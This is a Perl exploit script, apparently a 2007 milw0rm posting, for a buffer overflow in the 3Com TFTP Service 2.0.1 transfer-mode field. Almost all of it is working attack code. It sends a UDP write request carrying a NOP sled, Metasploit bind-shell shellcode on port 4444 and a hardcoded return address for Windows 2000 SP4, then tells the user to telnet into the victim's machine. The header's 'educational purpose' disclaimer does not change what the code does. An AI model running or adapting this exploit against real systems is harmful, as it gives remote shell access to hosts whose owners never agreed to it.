#!/usr/bin/perl -w
# ===============================================================================================
#                3Com TFTP Service <= 2.0.1 (Long Transporting Mode) Overflow Perl Exploit
#                               By Umesh Wanve (umesh_345@yahoo.com)
# ==============================================================================================          
# Credits : Liu Qixu is credited with the discovery of this vulnerability.
#
# Reference : http://www.securityfocus.com/bid/21301
#
# Date : 27-02-2007
#
# Tested on Windows 2000 SP4 Server English
#           Windows 2000 SP4 Professional English
#
# You can replace shellcode with your favourite one :)
#
# 
# Buffer overflow exists in transporting mode name of TFTP server.
# 
# So here you go.
#
# Buffer = \"\\x00\\x02\"      +  \"filename\"    +  \"\\x00\" +  nop sled +  Shellcode + JUMP  + \"\\x00\";
# 
#
# This was written for educational purpose. Use it at your own risk.Author will be not be responsible for any damage.
#
# #
#===============================================================================================
use IO::Socket;

if(!($ARGV[1]))
{
 print \"\\n3COM Tftp long transport name exploit\\n\";
 print \"\\tCoded by Umesh wanve\\n\\n\";
 print \"Use: 3com_tftp.pl <host> <port>\\n\\n\";
 exit;
}


$target = IO::Socket::INET->new(Proto=>\'udp\',
                                PeerAddr=>$ARGV[0],
                                PeerPort=>$ARGV[1])
                            or die \"Cannot connect to $ARGV[0] on port $ARGV[1]\";



# win32_bind -  EXITFUNC=seh LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com
 
my($shellcode)=
\"\\x31\\xc9\\x83\\xe9\\xb0\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\x48\".
\"\\xc8\\xb3\\x54\\x83\\xeb\\xfc\\xe2\\xf4\\xb4\\xa2\\x58\\x19\\xa0\\x31\\x4c\\xab\".
\"\\xb7\\xa8\\x38\\x38\\x6c\\xec\\x38\\x11\\x74\\x43\\xcf\\x51\\x30\\xc9\\x5c\\xdf\".
\"\\x07\\xd0\\x38\\x0b\\x68\\xc9\\x58\\x1d\\xc3\\xfc\\x38\\x55\\xa6\\xf9\\x73\\xcd\".
\"\\xe4\\x4c\\x73\\x20\\x4f\\x09\\x79\\x59\\x49\\x0a\\x58\\xa0\\x73\\x9c\\x97\\x7c\".
\"\\x3d\\x2d\\x38\\x0b\\x6c\\xc9\\x58\\x32\\xc3\\xc4\\xf8\\xdf\\x17\\xd4\\xb2\\xbf\".
\"\\x4b\\xe4\\x38\\xdd\\x24\\xec\\xaf\\x35\\x8b\\xf9\\x68\\x30\\xc3\\x8b\\x83\\xdf\".
\"\\x08\\xc4\\x38\\x24\\x54\\x65\\x38\\x14\\x40\\x96\\xdb\\xda\\x06\\xc6\\x5f\\x04\".
\"\\xb7\\x1e\\xd5\\x07\\x2e\\xa0\\x80\\x66\\x20\\xbf\\xc0\\x66\\x17\\x9c\\x4c\\x84\".
\"\\x20\\x03\\x5e\\xa8\\x73\\x98\\x4c\\x82\\x17\\x41\\x56\\x32\\xc9\\x25\\xbb\\x56\".
\"\\x1d\\xa2\\xb1\\xab\\x98\\xa0\\x6a\\x5d\\xbd\\x65\\xe4\\xab\\x9e\\x9b\\xe0\\x07\".
\"\\x1b\\x9b\\xf0\\x07\\x0b\\x9b\\x4c\\x84\\x2e\\xa0\\xa2\\x08\\x2e\\x9b\\x3a\\xb5\".
\"\\xdd\\xa0\\x17\\x4e\\x38\\x0f\\xe4\\xab\\x9e\\xa2\\xa3\\x05\\x1d\\x37\\x63\\x3c\".
\"\\xec\\x65\\x9d\\xbd\\x1f\\x37\\x65\\x07\\x1d\\x37\\x63\\x3c\\xad\\x81\\x35\\x1d\".
\"\\x1f\\x37\\x65\\x04\\x1c\\x9c\\xe6\\xab\\x98\\x5b\\xdb\\xb3\\x31\\x0e\\xca\\x03\".
\"\\xb7\\x1e\\xe6\\xab\\x98\\xae\\xd9\\x30\\x2e\\xa0\\xd0\\x39\\xc1\\x2d\\xd9\\x04\".
\"\\x11\\xe1\\x7f\\xdd\\xaf\\xa2\\xf7\\xdd\\xaa\\xf9\\x73\\xa7\\xe2\\x36\\xf1\\x79\".
\"\\xb6\\x8a\\x9f\\xc7\\xc5\\xb2\\x8b\\xff\\xe3\\x63\\xdb\\x26\\xb6\\x7b\\xa5\\xab\".
\"\\x3d\\x8c\\x4c\\x82\\x13\\x9f\\xe1\\x05\\x19\\x99\\xd9\\x55\\x19\\x99\\xe6\\x05\".
\"\\xb7\\x18\\xdb\\xf9\\x91\\xcd\\x7d\\x07\\xb7\\x1e\\xd9\\xab\\xb7\\xff\\x4c\\x84\".
\"\\xc3\\x9f\\x4f\\xd7\\x8c\\xac\\x4c\\x82\\x1a\\x37\\x63\\x3c\\xb8\\x42\\xb7\\x0b\".
\"\\x1b\\x37\\x65\\xab\\x98\\xc8\\xb3\\x54\";



print \"++ Building Malicous Packet .....\\n\";

$nop=\"\\x90\" x 129;  


$jmp_2000 = \"\\x0e\\x08\\xe5\\x77\";                              # jmp esi user32.dll windows 2000 sp4 english (on 27-02-2007)


$exploit = \"\\x00\\x02\";                                      #write request (header)

$exploit=$exploit.\"A\";                                      #file name   

$exploit=$exploit.\"\\x00\";                                   #Start of transporting name

$exploit=$exploit.$nop;                                     #nop sled to land into shellcode 

$exploit=$exploit.$shellcode;                               #our Hell code 

$exploit=$exploit.$jmp_2000;                               #jump to shellcode 

$exploit=$exploit.\"\\x00\";                                   #end of TS mode name



print $target $exploit;                                     #Attack on victim

print \"++ Exploit packet sent ...\\n\";

print \"++ Done.\\n\";

print \"++ Telnet to 4444 on victim\'s machine ....\\n\";
sleep(2);


close($target);

exit;

#------------------------------------------------------------------------------------------------------------

# milw0rm.com [2007-02-28]
